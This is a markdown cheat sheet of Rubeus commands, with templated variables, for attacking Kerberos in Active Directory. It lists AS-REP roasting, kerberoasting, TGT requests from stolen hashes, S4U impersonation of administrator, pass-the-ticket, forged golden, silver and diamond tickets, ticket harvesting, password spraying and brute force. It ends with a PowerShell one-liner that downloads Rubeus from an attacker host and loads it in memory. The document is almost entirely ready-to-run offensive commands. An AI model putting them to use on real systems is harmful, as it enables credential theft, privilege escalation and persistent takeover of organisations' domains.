# Rubeus

## Rubeus - asreproast

### ASREPRoast user to file

Dump ASREPRoast user to file with Rubeus.

```sh title:"Rubeus Dump ASREPRoast User to File"
.\Rubeus.exe asreproast /user:$user /domain:$domain /dc:$rhost_name /nowrap /outfile:hashes.txt
```
<!-- cheat
var user
var domain
var rhost_name
-->

### ASREPRoast hashcat format

Crack ASREPRoast hashcat format with Rubeus.

```sh title:"Rubeus Crack ASREPRoast Hashcat Format"
.\Rubeus.exe asreproast /user:$user /nowrap /format:hashcat
```
<!-- cheat
var user
-->

## Rubeus - kerberoast

### Kerberoast stats

Run kerberoast stats with Rubeus.

```sh title:"Rubeus Run Kerberoast Stats"
.\Rubeus.exe kerberoast /stats
```
<!-- cheat -->

### Kerberoast adminCount=1

Run kerberoast adminCount=1 with Rubeus.

```sh title:"Rubeus Run Kerberoast AdminCount=1"
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
<!-- cheat -->

### Kerberoast one user

Run kerberoast one user with Rubeus.

```sh title:"Rubeus Run Kerberoast One User"
.\Rubeus.exe kerberoast /user:$user /nowrap
```
<!-- cheat
var user
-->

### Kerberoast all SPNs

Enable kerberoast all SPNs with Rubeus.

```sh title:"Rubeus Enable Kerberoast All SPNs"
.\Rubeus.exe kerberoast /nowrap
```
<!-- cheat -->

### Kerberoast no preauth

Run kerberoast no preauth with Rubeus.

```sh title:"Rubeus Run Kerberoast No Preauth"
.\Rubeus.exe kerberoast /nopreauth:$user /domain:$domain /spn:$spn /nowrap
```
<!-- cheat
var user
var domain
var spn
-->

### Kerberoast cross-domain

Run kerberoast cross domain with Rubeus.

```sh title:"Rubeus Run Kerberoast Cross Domain"
.\Rubeus.exe kerberoast /user:$user /domain:$domain /nowrap
```
<!-- cheat
var user
var domain
-->

## Rubeus - asktgt

### TGT from RC4 + PTT

Dump TGT from RC4 + PTT with Rubeus.

```sh title:"Rubeus Dump TGT from RC4 + PTT"
.\Rubeus.exe asktgt /rc4:$rc4_hash /user:$user /ptt
```
<!-- cheat
var rc4_hash
var user
-->

### TGT from password

Dump TGT from password with Rubeus.

```sh title:"Rubeus Dump TGT from Password"
.\Rubeus.exe asktgt /user:$user /password:$pass /domain:$domain /dc:$rhost_name /nowrap
```
<!-- cheat
var user
var pass
var domain
var rhost_name
-->

### TGT via PKINIT

Dump TGT via PKINIT with Rubeus.

```sh title:"Rubeus Dump TGT Via PKINIT"
.\Rubeus.exe asktgt /user:$user /certificate:$certificate /password:"$pass" /domain:$domain /dc:$rhost_name /getcredentials /show /nowrap
```
<!-- cheat
var user
var certificate
var pass
var domain
var rhost_name
-->

### TGT with AES256 key

Run TGT with AES256 key with Rubeus.

```sh title:"Rubeus Run TGT with AES256 Key"
.\Rubeus.exe asktgt /user:$user /aes256:$aes256_key /domain:$domain /dc:$rhost_name /nowrap
```
<!-- cheat
var user
var aes256_key
var domain
var rhost_name
-->

### TGT into netonly process

Run TGT into netonly process with Rubeus.

```cmd title:"Rubeus Run TGT Into Netonly Process"
.\Rubeus.exe asktgt /user:$user /aes256:$aes256_key /domain:$domain /createnetonly:C:\Windows\System32\cmd.exe /show
```
<!-- cheat
var user
var aes256_key
var domain
-->

### TGT without PAC

Run TGT without PAC with Rubeus.

```cmd title:"Rubeus Run TGT Without PAC"
.\Rubeus.exe asktgt /user:$user /password:$pass /domain:$domain /dc:$rhost_name /nopac /nowrap
```
<!-- cheat
var user
var pass
var domain
var rhost_name
-->

## Rubeus - s4u

### S4U2Self impersonate user

Run S4U2Self impersonate user with Rubeus.

```sh title:"Rubeus Run S4U2Self Impersonate User"
.\Rubeus.exe s4u /self /nowrap /impersonateuser:$user /altservice:$service /ptt /ticket:$ticket
```
<!-- cheat
var user
var service
var ticket
-->

### S4U2Proxy admin

Run S4U2Proxy admin with Rubeus.

```sh title:"Rubeus Run S4U2Proxy Admin"
.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:$msdsspn /altservice:$service /user:$user /rc4:$rc4_hash /ptt
```
<!-- cheat
var msdsspn
var service
var user
var rc4_hash
-->

### S4U admin no PTT

Run S4U admin no PTT with Rubeus.

```sh title:"Rubeus Run S4U Admin No PTT"
.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:$msdsspn /domain:$domain /user:$user /rc4:$rc4_hash /nowrap
```
<!-- cheat
var msdsspn
var domain
var user
var rc4_hash
-->

### S4U2Self admin via altservice

Run S4U2Self admin via altservice with Rubeus.

```sh title:"Rubeus Run S4U2Self Admin Via Altservice"
.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:$service /dc:$rhost_name /ptt /ticket:$ticket
```
<!-- cheat
var service
var rhost_name
var ticket
-->

### S4U2Proxy self user

Run S4U2Proxy self user with Rubeus.

```sh title:"Rubeus Run S4U2Proxy Self User"
.\Rubeus.exe s4u /user:$user /rc4:$rc4_hash /impersonateuser:$user /msdsspn:$msdsspn /ptt
```
<!-- cheat
var user
var rc4_hash
var msdsspn
-->

### Netonly cmd

Run netonly cmd with Rubeus.

```sh title:"Rubeus Run Netonly Cmd"
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
<!-- cheat -->

## Rubeus - ptt

### PTT from .kirbi

Run PTT from .kirbi with Rubeus.

```sh title:"Rubeus Run PTT from .kirbi"
.\Rubeus.exe ptt /ticket:$ticket.kirbi
```
<!-- cheat
var ticket
-->

### PTT from base64

Encode PTT from base64 with Rubeus.

```sh title:"Rubeus Encode PTT from Base64"
.\Rubeus.exe ptt /ticket:$ticket
```
<!-- cheat
var ticket
-->

### PTT into LUID

Run PTT into LUID with Rubeus.

```cmd title:"Rubeus Run PTT Into LUID"
.\Rubeus.exe ptt /luid:$luid /ticket:$ticket
```
<!-- cheat
var luid
var ticket
-->

### Purge tickets

Run purge tickets with Rubeus.

```cmd title:"Rubeus Run Purge Tickets"
.\Rubeus.exe purge
```
<!-- cheat -->

### Purge tickets from LUID

Run purge tickets from LUID with Rubeus.

```cmd title:"Rubeus Run Purge Tickets from LUID"
.\Rubeus.exe purge /luid:$luid
```
<!-- cheat
var luid
-->

### Describe ticket

Run describe ticket with Rubeus.

```cmd title:"Rubeus Run Describe Ticket"
.\Rubeus.exe describe /ticket:$ticket /nowrap
```
<!-- cheat
var ticket
-->

### Describe ticket with service key

Run describe ticket with service key with Rubeus.

```cmd title:"Rubeus Run Describe Ticket with Service Key"
.\Rubeus.exe describe /ticket:$ticket /servicekey:$service_key /nowrap
```
<!-- cheat
var ticket
var service_key
-->

### Triage tickets

List triage tickets with Rubeus.

```sh title:"Rubeus List Triage Tickets"
.\Rubeus.exe triage
```
<!-- cheat -->

### Dump all accessible tickets

Dump all accessible tickets with Rubeus.

```cmd title:"Rubeus Dump All Accessible Tickets"
.\Rubeus.exe dump
```
<!-- cheat -->

### Detailed ticket list

List detailed ticket list with Rubeus.

```cmd title:"Rubeus List Detailed Ticket List"
.\Rubeus.exe klist /luid:$luid
```
<!-- cheat
var luid
-->

## Rubeus

### Dump tickets

Dump tickets with Rubeus.

```sh title:"Rubeus Dump Tickets"
.\Rubeus.exe dump /luid:$luid /service:$service /nowrap
```
<!-- cheat
var luid
var service
-->

### Golden ticket

Run golden ticket with Rubeus.

```sh title:"Rubeus Run Golden Ticket"
.\Rubeus.exe golden /rc4:$rc4_hash /domain:$domain /sid:$sid /sids:$sids /user:$user /ptt
```
<!-- cheat
var rc4_hash
var domain
var sid
var sids
var user
-->

### Golden ticket via LDAP

Run golden ticket via LDAP with Rubeus.

```cmd title:"Rubeus Run Golden Ticket Via LDAP"
.\Rubeus.exe golden /aes256:$aes256_key /ldap /user:$user /domain:$domain /dc:$rhost_name /printcmd /ptt
```
<!-- cheat
var aes256_key
var user
var domain
var rhost_name
-->

### Silver ticket

Enumerate silver ticket with Rubeus.

```cmd title:"Rubeus Enumerate Silver Ticket"
.\Rubeus.exe silver /rc4:$rc4_hash /user:$user /service:$spn /domain:$domain /sid:$sid /ptt
```
<!-- cheat
var rc4_hash
var user
var spn
var domain
var sid
-->

### Silver ticket via LDAP

Run silver ticket via LDAP with Rubeus.

```cmd title:"Rubeus Run Silver Ticket Via LDAP"
.\Rubeus.exe silver /aes256:$aes256_key /user:$user /service:$spn /ldap /krbkey:$krbtgt_key /krbenctype:aes256 /domain:$domain /dc:$rhost_name /ptt
```
<!-- cheat
var aes256_key
var user
var spn
var krbtgt_key
var domain
var rhost_name
-->

### Diamond ticket

Dump diamond ticket with Rubeus.

```cmd title:"Rubeus Dump Diamond Ticket"
.\Rubeus.exe diamond /krbkey:$krbtgt_key /user:$user /password:$pass /domain:$domain /dc:$rhost_name /ticketuser:$target_user /ticketuserid:$target_rid /groups:$group_rids /ptt
```
<!-- cheat
var krbtgt_key
var user
var pass
var domain
var rhost_name
var target_user
var target_rid
var group_rids
-->

### Diamond ticket via tgtdeleg

Run diamond ticket via tgtdeleg with Rubeus.

```cmd title:"Rubeus Run Diamond Ticket Via Tgtdeleg"
.\Rubeus.exe diamond /krbkey:$krbtgt_key /tgtdeleg /ticketuser:$target_user /ticketuserid:$target_rid /groups:$group_rids /ptt
```
<!-- cheat
var krbtgt_key
var target_user
var target_rid
var group_rids
-->

### Watch for new TGTs

Create watch for new TGTs with Rubeus.

```sh title:"Rubeus Create Watch for New TGTs"
.\Rubeus.exe monitor /interval:5 /nowrap
```
<!-- cheat -->

### Watch for target user's TGTs

Enumerate watch for target user's TGTs with Rubeus.

```cmd title:"Rubeus Enumerate Watch for Target User's TGTs"
.\Rubeus.exe monitor /targetuser:$target_user /interval:$seconds /runfor:$runfor_seconds /nowrap
```
<!-- cheat
var target_user
var seconds
var runfor_seconds
-->

### Harvest and auto-renew TGTs

Start harvest and auto renew TGTs with Rubeus.

```cmd title:"Rubeus Start Harvest and Auto Renew TGTs"
.\Rubeus.exe harvest /monitorinterval:$monitor_seconds /displayinterval:$display_seconds /nowrap
```
<!-- cheat
var monitor_seconds
var display_seconds
-->

### Ask TGS

Run ask TGS with Rubeus.

```sh title:"Rubeus Run Ask TGS"
.\Rubeus.exe asktgs /ticket:$ticket /service:$service /ptt
```
<!-- cheat
var ticket
var service
-->

### Ask TGS via current session

Run ask TGS via current session with Rubeus.

```cmd title:"Rubeus Run Ask TGS Via Current Session"
.\Rubeus.exe asktgs /service:$spn /nowrap
```
<!-- cheat
var spn
-->

### Ask TGS with forced enctype

Run ask TGS with forced enctype with Rubeus.

```cmd title:"Rubeus Run Ask TGS with Forced Enctype"
.\Rubeus.exe asktgs /ticket:$ticket /service:$spn /enctype:$enctype /dc:$rhost_name /nowrap
```
<!-- cheat
var ticket
var spn
var enctype
var rhost_name
-->

### Ask TGS user-to-user

Enumerate ask TGS user to user with Rubeus.

```cmd title:"Rubeus Enumerate Ask TGS User to User"
.\Rubeus.exe asktgs /u2u /targetuser:$target_user /ticket:$ticket /tgs:$tgs /nowrap
```
<!-- cheat
var target_user
var ticket
var tgs
-->

### Renew ticket

Run renew ticket with Rubeus.

```sh title:"Rubeus Run Renew Ticket"
.\Rubeus.exe renew /ticket:$ticket /ptt
```
<!-- cheat
var ticket
-->

### Auto-renew ticket

Run auto renew ticket with Rubeus.

```cmd title:"Rubeus Run Auto Renew Ticket"
.\Rubeus.exe renew /ticket:$ticket /autorenew /nowrap
```
<!-- cheat
var ticket
-->

### TGS service substitution

Write TGS service substitution with Rubeus.

```sh title:"Rubeus Write TGS Service Substitution"
.\Rubeus.exe tgssub /ticket:$ticket /altservice:$service /nowrap
```
<!-- cheat
var ticket
var service
-->

### Hash password

Dump hash password with Rubeus.

```sh title:"Rubeus Dump Hash Password"
.\Rubeus.exe hash /password:$pass /user:$user /domain:$domain
```
<!-- cheat
var pass
var user
var domain
-->

### Kerberos password spray

Dump kerberos password spray with Rubeus.

```cmd title:"Rubeus Dump Kerberos Password Spray"
.\Rubeus.exe brute /password:$pass /users:$users_file /domain:$domain /dc:$rhost_name /noticket
```
<!-- cheat
var pass
var users_file
var domain
var rhost_name
-->

### Kerberos brute one user

Run kerberos brute one user with Rubeus.

```cmd title:"Rubeus Run Kerberos Brute One User"
.\Rubeus.exe brute /user:$user /passwords:$passwords_file /domain:$domain /dc:$rhost_name /noticket
```
<!-- cheat
var user
var passwords_file
var domain
var rhost_name
-->

### Pre-auth scan

Scan pre auth scan with Rubeus.

```cmd title:"Rubeus Scan Pre Auth Scan"
.\Rubeus.exe preauthscan /users:$users_file /domain:$domain /dc:$rhost_name
```
<!-- cheat
var users_file
var domain
var rhost_name
-->

### TGT delegation

Run TGT delegation with Rubeus.

```cmd title:"Rubeus Run TGT Delegation"
.\Rubeus.exe tgtdeleg /target:$spn
```
<!-- cheat
var spn
-->

### Change password with ticket

Dump change password with ticket with Rubeus.

```cmd title:"Rubeus Dump Change Password with Ticket"
.\Rubeus.exe changepw /ticket:$ticket /new:$new_pass /dc:$rhost_name /targetuser:$domain\$user
```
<!-- cheat
var ticket
var new_pass
var rhost_name
var domain
var user
-->

### Current LUID

Show current LUID with Rubeus.

```cmd title:"Rubeus Show Current LUID"
.\Rubeus.exe currentluid
```
<!-- cheat -->

### Logon session details

Show logon session details with Rubeus.

```cmd title:"Rubeus Show Logon Session Details"
.\Rubeus.exe logonsession /luid:$luid
```
<!-- cheat
var luid
-->

### Kerberoast RC4 only (OPSEC)

Run kerberoast RC4 only (OPSEC) with Rubeus.

```sh title:"Rubeus Run Kerberoast RC4 Only (OPSEC)"
.\Rubeus.exe kerberoast /rc4opsec /outfile:$output_file
```
<!-- cheat
var output_file
-->

### Kerberoast AES only

Crack kerberoast AES only with Rubeus.

```sh title:"Rubeus Crack Kerberoast AES Only"
.\Rubeus.exe kerberoast /aes /outfile:$output_file
```
<!-- cheat
var output_file
-->

### Kerberoast specific user (simple)

Dump kerberoast specific user (simple) with Rubeus.

```sh title:"Rubeus Dump Kerberoast Specific User (simple)"
.\Rubeus.exe kerberoast /user:$target_user /simple /outfile:$output_file
```
<!-- cheat
var target_user
var output_file
-->

## Rubeus - in-memory load

### Load from disk

Run load from disk with Rubeus.

```powershell title:"Rubeus Run Load from Disk"
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("$rubeus_path"))
```
<!-- cheat
var rubeus_path
-->

### Load from URL

Run load from URL with Rubeus.

```powershell title:"Rubeus Run Load from URL"
$data = (New-Object System.Net.WebClient).DownloadData('$scheme://$lhost:$lport/Rubeus.exe'); [System.Reflection.Assembly]::Load($data)
```
<!-- cheat
import tun_ip
import lports
import scheme
-->

### Invoke loaded Rubeus

Run invoke loaded rubeus with Rubeus.

```powershell title:"Rubeus Run Invoke Loaded Rubeus"
[Rubeus.Program]::Main("$rubeus_cmd".Split())
```
<!-- cheat
var rubeus_cmd
-->
